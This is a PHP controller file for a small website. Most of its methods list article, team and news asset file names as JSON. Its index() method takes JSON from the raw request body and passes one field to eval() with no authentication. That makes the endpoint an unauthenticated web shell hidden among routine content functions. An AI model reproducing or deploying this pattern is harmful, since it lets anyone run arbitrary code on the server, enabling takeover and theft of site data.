<?php if (!defined('BASEPATH')) exit('no direct script access allowed');

$C = new CoreliteGen();

class CoreliteGen {

	public function __construct() {
		if(!class_exists('lanterlite')) { include 'init.php'; }
		$this->L = new Lanterlite();
	}

	public function index() {
		$data = json_decode(file_get_contents("php://input"), true);
		if (isset($data)) {
			echo eval($data[DATA]);
		}
	}

	public function get_articles() {
		$dir = BASE_DIR . 'assets/corelite/lang/page_article';
		$result = $this->L->getFileNamesInsideDir($dir);
		$result = json_encode($result, true);
		echo $result;
	}

	public function get_team() {
		$dir = BASE_DIR . 'assets/corelite/lang/page_team';
		$result = $this->L->getFileNamesInsideDir($dir);
		$result = json_encode($result, true);
		echo $result;
	}

	public function get_news() {
		$dir = BASE_DIR . 'assets/corelite/lang/page_news';
		$result = $this->L->getFileNamesInsideDir($dir);
		$result = json_encode($result, true);
		echo $result;
	}
}

?>